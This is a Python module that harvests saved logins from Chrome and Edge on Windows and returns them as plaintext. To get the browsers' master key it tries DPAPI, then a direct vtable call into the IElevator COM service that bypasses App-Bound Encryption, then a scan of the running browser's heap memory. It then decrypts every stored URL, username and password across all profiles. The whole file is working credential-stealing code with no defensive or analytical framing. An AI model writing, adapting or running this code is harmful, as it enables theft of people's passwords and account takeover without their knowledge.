"""
Decrypt saved passwords from Chrome and Edge (Chromium-based browsers).

Key decryption — three methods tried in order:
  1. DPAPI (CryptUnprotectData)  — Chrome < 127, pre-ABE
  2. IElevator COM (vtable[8])   — Chrome 127-129, ABE before caller lockdown
  3. Process memory scan         — Chrome 130+, reads live 32-byte AES key
                                   from the browser's own heap after it has
                                   already decrypted it on startup

Requires pywin32 and pycryptodome (already in requirements.txt).
"""
import base64
import ctypes
import json
import os
import shutil
import sqlite3
import struct
import tempfile

# ── DLL handles ───────────────────────────────────────────────────────────────

_kernel32 = ctypes.WinDLL("kernel32")
_ole32    = ctypes.WinDLL("ole32")
_oleaut32 = ctypes.WinDLL("oleaut32")

# ── kernel32 prototypes ───────────────────────────────────────────────────────

_kernel32.OpenProcess.restype   = ctypes.c_void_p
_kernel32.OpenProcess.argtypes  = [ctypes.c_ulong, ctypes.c_bool, ctypes.c_ulong]
_kernel32.CloseHandle.restype   = ctypes.c_bool
_kernel32.CloseHandle.argtypes  = [ctypes.c_void_p]
_kernel32.VirtualQueryEx.restype  = ctypes.c_size_t
_kernel32.VirtualQueryEx.argtypes = [ctypes.c_void_p, ctypes.c_void_p,
                                      ctypes.c_void_p, ctypes.c_size_t]
_kernel32.ReadProcessMemory.restype  = ctypes.c_bool
_kernel32.ReadProcessMemory.argtypes = [ctypes.c_void_p, ctypes.c_void_p,
                                         ctypes.c_void_p, ctypes.c_size_t,
                                         ctypes.POINTER(ctypes.c_size_t)]

# ── OLE prototypes ────────────────────────────────────────────────────────────

_ole32.CoInitializeEx.restype   = ctypes.HRESULT
_ole32.CoInitializeEx.argtypes  = [ctypes.c_void_p, ctypes.c_ulong]
_ole32.CLSIDFromString.restype  = ctypes.HRESULT
_ole32.CLSIDFromString.argtypes = [ctypes.c_wchar_p, ctypes.c_void_p]
_ole32.CoCreateInstance.restype  = ctypes.HRESULT
_ole32.CoCreateInstance.argtypes = [ctypes.c_void_p, ctypes.c_void_p,
                                     ctypes.c_ulong, ctypes.c_void_p,
                                     ctypes.c_void_p]

_oleaut32.SysAllocStringByteLen.restype  = ctypes.c_void_p
_oleaut32.SysAllocStringByteLen.argtypes = [ctypes.c_char_p, ctypes.c_uint]
_oleaut32.SysFreeString.restype  = None
_oleaut32.SysFreeString.argtypes = [ctypes.c_void_p]
_oleaut32.SysStringByteLen.restype  = ctypes.c_uint
_oleaut32.SysStringByteLen.argtypes = [ctypes.c_void_p]

# ── Memory scan constants ─────────────────────────────────────────────────────

_PTR = ctypes.sizeof(ctypes.c_void_p)   # 8 on 64-bit, 4 on 32-bit

if _PTR == 8:
    _MBI_SIZE       = 48
    _OFF_RGNSZ      = 24   # RegionSize
    _OFF_STATE      = 32
    _OFF_PROTECT    = 36
    _OFF_TYPE       = 40
    _RGNSZ_FMT      = "<Q"
    _USER_MAX       = (1 << 47) - 1
else:
    _MBI_SIZE       = 28
    _OFF_RGNSZ      = 12
    _OFF_STATE      = 16
    _OFF_PROTECT    = 20
    _OFF_TYPE       = 24
    _RGNSZ_FMT      = "<I"
    _USER_MAX       = 0x7FFFFFFF

_MEM_COMMIT      = 0x1000
_MEM_PRIVATE     = 0x20000
_PAGE_NOACCESS   = 0x01
_PAGE_GUARD      = 0x100
_PROC_VM_READ    = 0x0010
_PROC_QUERY_INFO = 0x0400

_MAX_REGION      = 2 * 1024 * 1024   # skip regions > 2 MB

# ── IElevator COM constants ───────────────────────────────────────────────────

_COINIT_MT        = 0
_CLSCTX_LOCAL_SVR = 4
_S_OK             = 0
_DECRYPT_VTX      = 8   # vtable index of DecryptData

_ELEVATOR_IID = "{463ABECF-9555-4147-9990-E7BC564875F1}"

_ELEVATOR_CLSIDS = {
    "Chrome": [
        "{708860E0-F641-4611-8895-7D867DD3675B}",  # Stable
        "{DD2CCCFB-8EEF-4A58-9891-B7AB9B1F7BF0}",  # Beta
        "{DA0B63A9-4E21-4A0E-9A61-F19F48F84F3E}",  # Dev
        "{47E5FC5E-F22F-4FCF-9DFB-B10CCDD7EF3D}",  # Canary
    ],
    "Edge": [
        "{1FCBE96C-1697-43AF-9140-2897C7C69767}",  # Stable
        "{DDC0BC04-B7F8-4E8E-AA08-B02EBEBCABD5}",  # Beta
    ],
}

_ELEVATOR_IIDS = {
    "Chrome": [_ELEVATOR_IID],
    "Edge":   ["{A779D01E-B099-4081-A7B3-A0F41FA4A3C0}", _ELEVATOR_IID],
}

_PROC_EXE = {
    "Chrome": "chrome",
    "Edge":   "msedge",
}

# ── Browser data paths ────────────────────────────────────────────────────────

_LOCAL = os.environ.get("LOCALAPPDATA", "")
_BROWSERS = {
    "Chrome": os.path.join(_LOCAL, r"Google\Chrome\User Data"),
    "Edge":   os.path.join(_LOCAL, r"Microsoft\Edge\User Data"),
}


# ── Helper: parse one GUID string into a 16-byte buffer ──────────────────────

def _guid_buf(s):
    buf = (ctypes.c_byte * 16)()
    _ole32.CLSIDFromString(s, ctypes.byref(buf))
    return buf


# ── Method 2: IElevator COM ───────────────────────────────────────────────────

def _ielevator_decrypt(clsid_str, iid_str, blob):
    """
    Call IElevator.DecryptData via raw vtable.
    Returns the plaintext AES key bytes, or None on failure.
    """
    try:
        _ole32.CoInitializeEx(None, _COINIT_MT)
    except Exception:
        pass

    clsid = _guid_buf(clsid_str)
    iid   = _guid_buf(iid_str)
    ppv   = ctypes.c_void_p()

    hr = _ole32.CoCreateInstance(
        ctypes.byref(clsid), None, _CLSCTX_LOCAL_SVR,
        ctypes.byref(iid), ctypes.byref(ppv),
    )
    if hr != _S_OK or not ppv.value:
        return None

    vtbl = ctypes.cast(ppv.value, ctypes.POINTER(ctypes.POINTER(ctypes.c_size_t)))
    result = None
    try:
        DecryptData = ctypes.WINFUNCTYPE(
            ctypes.HRESULT,
            ctypes.c_void_p,                  # this
            ctypes.c_void_p,                  # BSTR ciphertext
            ctypes.POINTER(ctypes.c_void_p),  # BSTR* plaintext (out)
            ctypes.POINTER(ctypes.c_ulong),   # DWORD* last_error (out)
        )(vtbl[0][_DECRYPT_VTX])

        in_bstr  = _oleaut32.SysAllocStringByteLen(blob, len(blob))
        out_bstr = ctypes.c_void_p()
        last_err = ctypes.c_ulong(0)

        hr2 = DecryptData(ppv, in_bstr, ctypes.byref(out_bstr), ctypes.byref(last_err))
        _oleaut32.SysFreeString(in_bstr)

        if hr2 == _S_OK and out_bstr.value:
            n      = _oleaut32.SysStringByteLen(out_bstr.value)
            result = (ctypes.c_char * n).from_address(out_bstr.value).raw
            _oleaut32.SysFreeString(out_bstr.value)
    except Exception:
        pass
    finally:
        try:
            Release = ctypes.WINFUNCTYPE(ctypes.c_ulong, ctypes.c_void_p)(vtbl[0][2])
            Release(ppv)
        except Exception:
            pass
    return result


# ── Method 3: process memory scan ────────────────────────────────────────────

def _scan_pid(pid, iv, enc, tag):
    """
    Walk one process's private heap pages looking for a 32-byte AES-GCM key
    that successfully decrypts (iv, enc, tag).
    """
    from Crypto.Cipher import AES

    h = _kernel32.OpenProcess(_PROC_VM_READ | _PROC_QUERY_INFO, False, pid)
    if not h:
        return None

    mbi = (ctypes.c_char * _MBI_SIZE)()
    try:
        addr = 0
        while addr < _USER_MAX:
            if not _kernel32.VirtualQueryEx(h, ctypes.c_void_p(addr), mbi, _MBI_SIZE):
                break

            rgnsz   = struct.unpack_from(_RGNSZ_FMT, mbi, _OFF_RGNSZ)[0]
            state   = struct.unpack_from("<I",        mbi, _OFF_STATE)[0]
            protect = struct.unpack_from("<I",        mbi, _OFF_PROTECT)[0]
            mtype   = struct.unpack_from("<I",        mbi, _OFF_TYPE)[0]

            next_addr = addr + rgnsz

            if (state   == _MEM_COMMIT
                    and mtype   == _MEM_PRIVATE
                    and not (protect & (_PAGE_NOACCESS | _PAGE_GUARD))
                    and 32 <= rgnsz <= _MAX_REGION):

                buf  = (ctypes.c_char * rgnsz)()
                nrd  = ctypes.c_size_t(0)
                if _kernel32.ReadProcessMemory(
                    h, ctypes.c_void_p(addr), buf, rgnsz, ctypes.byref(nrd)
                ):
                    chunk = bytes(buf[: nrd.value])
                    for i in range(0, len(chunk) - 32, 4):
                        candidate = chunk[i: i + 32]
                        try:
                            AES.new(candidate, AES.MODE_GCM, iv).decrypt_and_verify(enc, tag)
                            return candidate
                        except Exception:
                            pass

            addr = next_addr
    finally:
        _kernel32.CloseHandle(h)
    return None


def _find_key_in_memory(browser, test_blob):
    """
    Scan all running browser processes for the live AES master key.
    test_blob: a raw v10/v11 password ciphertext used to verify candidates.
    """
    if not test_blob or test_blob[:3] not in (b"v10", b"v11"):
        return None

    try:
        import psutil
    except ImportError:
        return None

    iv  = test_blob[3:15]
    enc = test_blob[15:-16]
    tag = test_blob[-16:]

    target = _PROC_EXE.get(browser, "").lower()
    if not target:
        return None

    for proc in psutil.process_iter(["pid", "name"]):
        try:
            if proc.info["name"].lower().replace(".exe", "") != target:
                continue
            key = _scan_pid(proc.info["pid"], iv, enc, tag)
            if key:
                return key
        except Exception:
            continue
    return None


# ── Key retrieval (all methods) ───────────────────────────────────────────────

def _get_key(local_state_path, browser="Chrome", test_blob=None):
    with open(local_state_path, "r", encoding="utf-8") as f:
        data = json.load(f)
    blob = base64.b64decode(data["os_crypt"]["encrypted_key"])[5:]  # strip DPAPI prefix

    # Method 1: DPAPI — works on Chrome < 127
    try:
        import win32crypt
        return win32crypt.CryptUnprotectData(blob, None, None, None, 0)[1]
    except Exception:
        pass

    # Method 2: IElevator COM — works on Chrome 127-129
    for clsid in _ELEVATOR_CLSIDS.get(browser, []):
        for iid in _ELEVATOR_IIDS.get(browser, [_ELEVATOR_IID]):
            key = _ielevator_decrypt(clsid, iid, blob)
            if key:
                return key

    # Method 3: Memory scan — works on Chrome 130+ if browser is running
    key = _find_key_in_memory(browser, test_blob)
    if key:
        return key

    raise RuntimeError(
        f"All key-extraction methods failed for {browser}. "
        "DPAPI rejected, IElevator rejected, and memory scan found no match "
        "(is the browser running?)."
    )


# ── SQLite helpers ────────────────────────────────────────────────────────────

def _copy_db(path):
    tmp = tempfile.mktemp(suffix=".db")
    shutil.copy2(path, tmp)
    return tmp


def _get_test_blob(login_data_path):
    """Return the first v10/v11 blob from Login Data (needed for memory scan)."""
    tmp = _copy_db(login_data_path)
    try:
        con  = sqlite3.connect(tmp)
        rows = con.execute("SELECT password_value FROM logins LIMIT 20").fetchall()
        con.close()
    except Exception:
        return None
    finally:
        try: os.remove(tmp)
        except: pass
    for (pw,) in rows:
        if pw and bytes(pw)[:3] in (b"v10", b"v11"):
            return bytes(pw)
    return None


def _decrypt_password(blob, key):
    if not blob:
        return ""
    try:
        b = bytes(blob)
        if b[:3] in (b"v10", b"v11"):
            from Crypto.Cipher import AES
            iv, enc, tag = b[3:15], b[15:-16], b[-16:]
            return AES.new(key, AES.MODE_GCM, iv).decrypt_and_verify(enc, tag).decode("utf-8", errors="replace")
        import win32crypt
        return win32crypt.CryptUnprotectData(b, None, None, None, 0)[1].decode("utf-8", errors="replace")
    except Exception as e:
        return f"[decrypt failed: {e}]"


def _read_logins(login_data_path, key, browser, profile):
    tmp = _copy_db(login_data_path)
    try:
        con  = sqlite3.connect(tmp)
        rows = con.execute(
            "SELECT origin_url, username_value, password_value FROM logins"
        ).fetchall()
        con.close()
    finally:
        try: os.remove(tmp)
        except: pass
    return [
        {
            "browser":  browser,
            "profile":  profile,
            "url":      url,
            "username": username,
            "password": _decrypt_password(pw, key),
        }
        for url, username, pw in rows
    ]


# ── Public API ────────────────────────────────────────────────────────────────

def get_browser_passwords():
    """Return list of {browser, profile, url, username, password} dicts."""
    results = []
    for browser, user_data in _BROWSERS.items():
        if not os.path.isdir(user_data):
            continue
        local_state = os.path.join(user_data, "Local State")
        if not os.path.isfile(local_state):
            continue

        # Collect a test blob from the first available Login Data
        # (used only if method 3 is needed)
        test_blob = None
        for profile in ["Default"] + [f"Profile {i}" for i in range(1, 30)]:
            db = os.path.join(user_data, profile, "Login Data")
            if os.path.isfile(db):
                test_blob = _get_test_blob(db)
                if test_blob:
                    break

        try:
            key = _get_key(local_state, browser, test_blob)
        except Exception:
            continue

        for profile in ["Default"] + [f"Profile {i}" for i in range(1, 30)]:
            db = os.path.join(user_data, profile, "Login Data")
            if not os.path.isfile(db):
                continue
            try:
                results.extend(_read_logins(db, key, browser, profile))
            except Exception:
                continue

    return results
